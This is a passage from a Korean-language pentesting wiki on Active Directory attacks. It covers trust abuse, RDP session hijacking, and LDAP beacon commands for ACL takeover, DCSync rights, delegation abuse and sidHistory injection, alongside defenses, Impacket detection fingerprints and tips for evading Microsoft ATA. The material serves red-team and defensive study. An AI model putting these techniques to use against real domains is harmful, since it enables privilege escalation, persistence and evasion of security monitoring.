하지만 **trusting domain이 어떤 도메인을 신뢰하면**, trusted domain은 **예측 가능한 이름**을 사용하고 **trusted password를 암호로 사용하는 사용자**를 **생성합니다**. 즉, **trusting domain의 사용자로 접근해 trusted domain에 들어가**, 해당 도메인을 열거하고 더 많은 권한으로 상승을 시도할 수 있습니다:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain을 침해하는 또 다른 방법은 도메인 트러스트와 **반대 방향**으로 생성된 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)를 찾는 것입니다(이는 흔한 경우는 아닙니다).

trusted domain을 침해하는 또 다른 방법은 **trusted domain의 사용자가 접근할 수 있는** 머신에서 대기하며 **RDP**로 로그인하기를 기다리는 것입니다. 그러면 공격자는 RDP 세션 프로세스에 코드를 삽입해 **피해자의 원래 도메인에 접근**할 수 있습니다.\
또한 **피해자가 자신의 하드 드라이브를 마운트한 경우**, 공격자는 **RDP 세션** 프로세스에서 **하드 드라이브의 시작 프로그램 폴더**에 **backdoors**를 저장할 수 있습니다. 이 기법을 **RDPInception**이라고 합니다.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 도메인 트러스트 악용 완화

### **SID Filtering:**

- 포리스트 트러스트에서 SID history 속성을 악용하는 공격의 위험은 SID Filtering으로 완화됩니다. SID Filtering은 기본적으로 모든 포리스트 간 트러스트에서 활성화되어 있습니다. 이는 Microsoft의 관점에 따라 도메인이 아닌 포리스트를 보안 경계로 간주하고, 포리스트 내 트러스트는 안전하다는 가정을 기반으로 합니다.
- 하지만 주의할 점이 있습니다. SID filtering은 애플리케이션과 사용자 접근을 방해할 수 있어 간혹 비활성화되기도 합니다.

### **Selective Authentication:**

- 포리스트 간 트러스트에는 Selective Authentication을 사용해 두 포리스트의 사용자가 자동으로 인증되지 않도록 합니다. 대신 사용자가 trusting domain 또는 forest 내의 도메인과 서버에 접근하려면 명시적 권한이 필요합니다.
- 이러한 조치로 쓰기 가능한 Configuration Naming Context (NC) 악용이나 트러스트 계정 공격을 방어할 수는 없다는 점에 유의하세요.

[**ired.team에서 도메인 트러스트에 대해 자세히 알아보기.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## 호스트 내 임플란트에서 LDAP 기반 AD 악용

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection)은 bloodyAD 스타일의 LDAP 프리미티브를 x64 Beacon Object File로 재구현해, 호스트 내 임플란트(예: Adaptix C2)에서 전적으로 실행합니다. 작업자는 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`로 팩을 컴파일하고, `ldap.axs`를 로드한 다음 beacon에서 `ldap <subcommand>`를 호출합니다. 모든 트래픽은 현재 로그온 보안 컨텍스트를 사용해 서명/봉인된 LDAP(389) 또는 자동 인증서 신뢰가 적용된 LDAPS(636)를 통해 전송되므로 socks 프록시나 디스크 아티팩트가 필요하지 않습니다.<sup>[[4]](#references)</sup>

### 임플란트 측 LDAP 열거

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, `get-groupmembers`는 짧은 이름/OU 경로를 전체 DN으로 변환하고 해당 객체를 덤프합니다.
- `get-object`, `get-attribute`, `get-domaininfo`는 임의의 속성(보안 설명자 포함)과 `rootDSE`의 포리스트/도메인 메타데이터를 가져옵니다.
- `get-uac`, `get-spn`, `get-delegation`, `get-rbcd`는 roasting 대상, 위임 설정, 그리고 LDAP에서 기존 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 설명자를 직접 확인합니다.
- `get-acl`과 `get-writable --detailed`는 DACL을 파싱해 trustee, 권한(GenericAll/WriteDACL/WriteOwner/속성 쓰기), 상속을 나열하여 ACL 권한 상승의 즉각적인 표적을 제공합니다.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### 권한 상승 및 persistence를 위한 LDAP 쓰기 기본 기능

- 객체 생성 BOF(`add-user`, `add-computer`, `add-group`, `add-ou`)를 사용하면 OU 쓰기 권한이 있는 위치에 새 principal 또는 컴퓨터 계정을 준비할 수 있습니다. 쓰기 속성 권한을 찾은 뒤에는 `add-groupmember`, `set-password`, `add-attribute`, `set-attribute`로 대상을 직접 탈취할 수 있습니다.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, `add-dcsync`와 같은 ACL 중심 명령은 AD 객체의 WriteDACL/WriteOwner 권한을 비밀번호 재설정, 그룹 멤버십 제어 또는 DCSync 복제 권한으로 바꿉니다. PowerShell/ADSI 흔적을 남기지 않으며, `remove-*` 대응 명령으로 추가한 ACE를 정리할 수 있습니다.

### Delegation, roasting 및 Kerberos 악용

- `add-spn`/`set-spn`을 사용하면 침해한 사용자를 즉시 Kerberoastable 상태로 만들 수 있습니다. `add-asreproastable`(UAC 토글)은 비밀번호를 건드리지 않고 AS-REP roasting 대상으로 표시합니다.
- Delegation 매크로(`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`)는 beacon에서 `msDS-AllowedToDelegateTo`, UAC 플래그 또는 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 수정합니다. 이를 통해 constrained/unconstrained/RBCD 공격 경로를 열고 원격 PowerShell이나 RSAT를 사용할 필요를 없앱니다.

### sidHistory 주입, OU 이동 및 공격 표면 조정

- `add-sidhistory`는 제어 중인 principal의 SID history에 권한 있는 SID를 주입합니다([SID-History Injection](sid-history-injection.md) 참조). 이를 통해 LDAP/LDAPS만으로 은밀하게 액세스를 상속받을 수 있습니다.
- `move-object`는 컴퓨터나 사용자의 DN/OU를 변경합니다. 공격자는 이를 이용해 자산을 이미 위임된 권한이 있는 OU로 옮긴 뒤 `set-password`, `add-groupmember` 또는 `add-spn`을 악용할 수 있습니다.
- 범위가 엄격하게 제한된 제거 명령(`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` 등)을 사용하면 자격 증명이나 persistence를 수집한 후 신속하게 되돌려 telemetry를 최소화할 수 있습니다.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 몇 가지 일반적인 방어 방법

[**자격 증명 보호 방법에 대해 자세히 알아보세요.**](../stealing-credentials/credentials-protections.md)

### **자격 증명 보호를 위한 방어 조치**

- **Domain Admins 제한**: Domain Admins는 Domain Controller에만 로그인할 수 있도록 하고, 다른 호스트에서는 사용하지 않는 것이 좋습니다.
- **서비스 계정 권한**: 보안을 위해 서비스를 Domain Admin(DA) 권한으로 실행하지 않아야 합니다.
- **권한 사용 시간 제한**: DA 권한이 필요한 작업은 권한 사용 시간을 제한해야 합니다. 다음과 같이 설정할 수 있습니다: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 완화**: Event ID 2889/3074/3075를 감사한 다음, DC/클라이언트에서 LDAP signing 및 LDAPS channel binding을 적용해 LDAP MITM/relay 시도를 차단합니다.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket 활동의 프로토콜 수준 fingerprinting

일반적인 AD tradecraft를 탐지하려면 바이너리 이름 변경, 서비스 이름, 임시 batch 파일 또는 출력 경로와 같은 **운영자가 제어할 수 있는 흔적에만 의존하지 마세요**. 정상 Windows 클라이언트가 [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC 및 WMI 트래픽을 생성하는 방식을 기준선으로 설정하고, 운영자가 `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` 또는 `ntlmrelayx.py`를 수정한 뒤에도 남는 **구현상의 특이점**을 찾으세요.<sup>[[8]](#references)</sup>

- **신뢰도 높은 단독 탐지 후보**(자체 기준선과 대조 검증 후):
  - `auth_context_id = 79231 + ctx_id`를 사용하는 인증된 DCE/RPC
  - `0xff`로 채워진 DCE/RPC 인증 패딩
  - SPNEGO `mechToken`에 원시 Kerberos `AP-REQ`를 직접 넣는 LDAP Kerberos bind
  - ASCII처럼 보이는 `ClientGuid` 값이 포함된 SMB2/3 negotiate 요청
  - 비표준 namespace `//./root/cimv2`를 사용하는 WMI `IWbemLevel1Login::NTLMLogin`
  - 하드코딩된 Kerberos nonce 값
- **상관 분석/점수 산정 특성으로 더 적합한 항목**:
  - 드문 형식이거나 중복된 Kerberos etype 목록, 비정상적이거나 누락된 `PA-DATA`, 또는 native Windows와 다른 TGS-REQ etype 순서
  - version 정보가 없는 NTLM Type 1 메시지 또는 호스트 이름이 null인 Type 3 메시지
  - SPNEGO 대신 DCE/RPC에 담긴 원시 NTLMSSP, 누락된 DCE/RPC verification trailer, 또는 SPNEGO/Kerberos OID 불일치
  - 동일한 호스트/사용자/세션/시간 범위에서 여러 특성이 함께 나타나면, 약한 단일 필드 하나보다 훨씬 강한 신호가 됩니다.
- **단독 경보가 아닌 보강 정보로 사용**:
  - 기본 파일 이름, 출력 경로, 임의 서비스 이름, 임시 batch 이름, 기본 컴퓨터 계정 이름, 도구별 HTTP/WebDAV/RDP/MSSQL 문자열
  - 운영자가 쉽게 바꿀 수 있으므로, 프로토콜 간 연관된 활동 묶음이 의심스러운 이유를 설명하는 데 사용하는 것이 좋습니다.
- **운영 참고 사항**:
  - 일부 신호를 확인하려면 복호화된 트래픽, [PCAP/Zeek 분석](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW 또는 서비스 측 가시성이 필요합니다.
  - 경보로 전환하기 전에 Samba/Linux 클라이언트, 어플라이언스 및 레거시 소프트웨어를 기준으로 검증하세요.
  - 기준선에 대한 신뢰도를 높여 가면서 탐지를 보강 정보 -> 헌팅 -> 경보 순으로 전환하세요.

### **Deception 기법 구현**

- Deception을 구현하려면 비밀번호가 만료되지 않거나 Trusted for Delegation으로 표시된 decoy 사용자 또는 컴퓨터와 같은 함정을 설치합니다. 구체적인 방법으로는 특정 권한을 가진 사용자를 만들거나 높은 권한의 그룹에 추가할 수 있습니다.<sup>[[2]](#references)</sup>
- 실제 예시는 다음과 같은 도구를 사용하는 것입니다: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- deception 기법 배포에 대한 자세한 내용은 [GitHub의 Deploy-Deception](https://github.com/samratashok/Deploy-Deception)을 참조하세요.

### **Deception 식별**

- **사용자 객체**: 비정상적인 ObjectSID, 드문 로그인, 생성 날짜 및 낮은 잘못된 비밀번호 입력 횟수는 의심스러운 신호입니다.
- **일반적인 신호**: 잠재적인 decoy 객체의 속성을 정상 객체와 비교하면 불일치를 찾아낼 수 있습니다. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster)와 같은 도구를 사용하면 이러한 deception을 식별하는 데 도움이 됩니다.

### **탐지 시스템 우회**

- **Microsoft ATA 탐지 우회**:
  - **사용자 열거**: ATA 탐지를 피하려면 Domain Controller에서 세션 열거를 하지 않습니다.
  - **티켓 사칭**: 티켓 생성에 **aes** 키를 사용하면 NTLM으로 다운그레이드하지 않아 탐지를 피할 수 있습니다.
  - **DCSync 공격**: ATA 탐지를 피하려면 Domain Controller가 아닌 곳에서 실행하는 것이 좋습니다. Domain Controller에서 직접 실행하면 경보가 발생합니다.

## References

- [1] [도메인 Trust 공격 가이드](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory에서 Deception을 위한 Trust 위조](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin에서 Enterprise Admin으로](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF 컬렉션 – Active Directory 악용을 위한 메모리 내 LDAP 도구 모음](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hash를 Wordlist로 활용하기](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket 분석](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon을 통한 Active Directory 계정 탈취](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472와 관련된 Netlogon 보안 채널 연결 변경 사항 관리 방법](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [잊힌 Null Session 및 MS-RPC 인터페이스 살펴보기](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [도메인 간 보안 경계로서의 SID filter? (4부) - SID filtering 우회 연구](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [도메인 간 보안 경계로서의 SID filter? (5부) - Golden GMSA trust 공격 - 자식 도메인에서 부모 도메인으로](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [도메인 간 보안 경계로서의 SID filter? (6부) - Schema 변경 trust 공격 - 자식 도메인에서 부모 도메인으로](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5를 이용한 DA에서 EA로의 권한 상승](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS를 악용해 5분 만에 자식 도메인 관리자에서 Enterprise Admin으로 권한 상승: 후속 글](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [숨겨 둔 ACE: Active Directory DACL 백도어 설계](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k 모듈 소스 코드](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership 속성](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
